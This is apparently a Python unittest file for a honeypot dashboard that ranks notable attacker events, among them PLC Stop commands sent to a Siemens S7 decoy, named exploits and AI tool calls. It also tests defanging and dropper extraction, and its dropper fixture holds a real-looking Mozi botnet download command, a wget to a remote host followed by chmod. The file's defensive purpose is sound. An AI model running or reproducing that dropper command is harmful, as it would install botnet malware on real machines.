"""What is worth a look: first-this-week events and new droppers."""
import os
import tempfile
import time
import unittest

from fastapi.testclient import TestClient

from uninvited.app import Hub, build_app
from uninvited.core import Config, Knock
from uninvited.feeds import FeedCache
from uninvited.notables import defang, notables, signature
from uninvited.store import Store

DAY = 86400


def make_store():
    tmp = tempfile.mkdtemp()
    return Store(os.path.join(tmp, "t.db")), tmp


def knock(ts, proto="S7", ip="203.0.113.7", lines=(), detail=None, kind="attack", country="The Netherlands"):
    k = Knock(proto=proto, ip=ip, port=102, ts=ts, lines=list(lines), detail=dict(detail or {}))
    k.kind, k.country, k.iso = kind, country, "NL"
    return k


STOP = [("function", "PLC Stop")]


class SignatureTests(unittest.TestCase):
    def test_a_control_command_has_an_identity(self):
        self.assertEqual(signature("S7", dict(STOP), {"ics": "control"}), ("ics", "S7", "control", "PLC Stop"))

    def test_a_read_or_identity_request_is_routine(self):
        self.assertIsNone(signature("S7", {"function": "Read SZL"}, {"ics": "identity"}))
        self.assertIsNone(signature("MODBUS", {}, {"ics": "read"}))

    def test_a_named_exploit_counts_but_a_generic_probe_does_not(self):
        self.assertEqual(signature("HTTP", {"exploit": "Hikvision RCE"}, {}), ("exploit", "Hikvision RCE"))
        self.assertIsNone(signature("HTTP", {"exploit": "Unclassified Probe"}, {}))

    def test_an_ai_tool_call_counts(self):
        self.assertEqual(signature("MCP", {"tool": "run_command"}, {}), ("tool", "run_command"))

    def test_password_guessing_is_never_notable(self):
        self.assertIsNone(signature("SSH", {}, {}))


class NotableTests(unittest.TestCase):
    def setUp(self):
        self.store, self.tmp = make_store()
        self.now = int(time.time())

    def tearDown(self):
        self.store.close()

    def test_a_stop_nobody_sent_last_week_is_first_this_week(self):
        self.store.record(knock(self.now - 600, lines=STOP, detail={"ics": "control"}))
        out = notables(self.store, 1, self.now)
        self.assertEqual([i["tag"] for i in out], ["FIRST THIS WEEK"])
        self.assertEqual(out[0]["title"], "PLC Stop sent to the Siemens S7 decoy")
        self.assertEqual(out[0]["meta"], "S7 · The Netherlands")

    def test_the_same_stop_last_week_is_not_new_but_it_is_active(self):
        self.store.record(knock(self.now - 3 * DAY, lines=STOP, detail={"ics": "control"}, ip="198.51.100.9"))
        self.store.record(knock(self.now - 600, lines=STOP, detail={"ics": "control"}))
        self.store.record(knock(self.now - 500, lines=STOP, detail={"ics": "control"}, ip="198.51.100.10"))
        out = notables(self.store, 1, self.now)
        self.assertEqual([i["tag"] for i in out], ["ACTIVE NOW"])
        self.assertEqual(out[0]["title"], "PLC Stop sent to the Siemens S7 decoy")
        self.assertEqual(out[0]["meta"], "S7 · 2 hosts this hour · seen on 2 of the last 8 days")
        self.assertEqual(out[0]["count"], 2)
        # news first, repeats after, and the Atom feed carries only the news
        self.store.record(knock(self.now - 900, proto="MCP", ip="198.51.100.11", lines=[("tool", "run_command")]))
        out = notables(self.store, 1, self.now)
        self.assertEqual([i["tag"] for i in out], ["FIRST THIS WEEK", "ACTIVE NOW"])
        from uninvited.notables import atom
        xml = atom(out, "Uninvited", "example.org", self.now)
        self.assertIn("run_command", xml)
        self.assertNotIn("PLC Stop", xml)

    def test_a_stop_from_eight_days_ago_has_been_forgotten(self):
        self.store.record(knock(self.now - 8 * DAY, lines=STOP, detail={"ics": "control"}))
        self.store.record(knock(self.now - 600, lines=STOP, detail={"ics": "control"}))
        self.assertEqual(len(notables(self.store, 1, self.now)), 1)

    def test_repeats_inside_the_window_fold_into_one_item_with_a_count(self):
        for i in range(4):
            self.store.record(knock(self.now - 100 * i, lines=STOP, detail={"ics": "control"}, ip=f"203.0.113.{i + 1}"))
        out = notables(self.store, 1, self.now)
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["count"], 4)

    def test_a_different_function_is_a_different_thing(self):
        self.store.record(knock(self.now - 3 * DAY, lines=[("function", "PLC Start")], detail={"ics": "control"}))
        self.store.record(knock(self.now - 600, lines=STOP, detail={"ics": "control"}))
        self.assertEqual(len(notables(self.store, 1, self.now)), 1)

    def test_research_scanners_and_events_outside_the_window_are_ignored(self):
        self.store.record(knock(self.now - 600, lines=STOP, detail={"ics": "control"}, kind="research"))
        self.store.record(knock(self.now - 2 * 3600, lines=STOP, detail={"ics": "control"}, ip="198.51.100.5"))
        self.assertEqual(notables(self.store, 1, self.now), [])

    def test_a_dropper_first_seen_in_the_window_is_a_new_dropper(self):
        d = knock(self.now - 300, proto="CAM", ip="198.51.100.20", lines=[("exploit", "Hikvision RCE")])
        from uninvited.droppers import extract
        d.droppers = extract("cd /tmp; wget http://45.33.32.7:43777/Mozi.a; chmod 777 Mozi.a")
        self.assertTrue(d.droppers)
        self.store.record(d)
        out = [i for i in notables(self.store, 1, self.now) if i["tag"] == "NEW DROPPER"]
        self.assertEqual(len(out), 1)
        self.assertIn("hxxp://45[.]33[.]32[.]7:43777/Mozi[.]a", out[0]["meta"])
        self.assertNotIn("http://", out[0]["meta"])

    def test_the_list_is_newest_first_and_capped(self):
        for i in range(10):
            self.store.record(knock(self.now - 10 * i, proto="MCP", ip=f"203.0.113.{i + 1}", detail={},
                                    lines=[("tool", f"tool_{i}")]))
        out = notables(self.store, 1, self.now)
        self.assertEqual(len(out), 6)
        self.assertEqual([i["ts"] for i in out], sorted((i["ts"] for i in out), reverse=True))

    def test_defang(self):
        self.assertEqual(defang("tftp://203.0.113.6/bins.sh"), "tftp://203[.]0[.]113[.]6/bins[.]sh")


class ServiceTests(unittest.TestCase):
    def test_connections_are_counted_per_service_inside_the_window(self):
        store, _ = make_store()
        now = int(time.time())
        for ts, proto in ((now - 60, "SSH"), (now - 90, "SSH"), (now - 30, "TNET"), (now - 7200, "SSH")):
            store.record(knock(ts, proto=proto, ip=f"203.0.113.{ts % 200}"))
        self.assertEqual(store.services(1), {"SSH": 2, "TNET": 1})
        self.assertEqual(store.services(3), {"SSH": 3, "TNET": 1})
        store.close()

class EndpointTests(unittest.TestCase):
    def test_the_endpoint_answers_and_clamps_its_window(self):
        tmp = tempfile.mkdtemp()
        db = os.path.join(tmp, "t.db")
        cfg = Config({"database": db, "services": [{"proto": "SSH", "port": 22}], "site": {}})
        store = Store(db)
        store.record(knock(int(time.time()) - 60, lines=STOP, detail={"ics": "control"}))
        feeds = FeedCache(db)
        feeds.refresh()
        client = TestClient(build_app(cfg, store, Hub(cfg, store), feeds))
        r = client.get("/api/notables?hours=1")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.json()["notables"][0]["tag"], "FIRST THIS WEEK")
        self.assertEqual(client.get("/api/notables?hours=999").status_code, 422)
        self.assertEqual(client.get("/api/notables?hours=0").status_code, 422)
        self.assertEqual(client.get("/api/services?hours=1").json()["services"], {"S7": 1})
        self.assertEqual(client.get("/api/services?hours=500").status_code, 422)
        store.close()


if __name__ == "__main__":
    unittest.main()
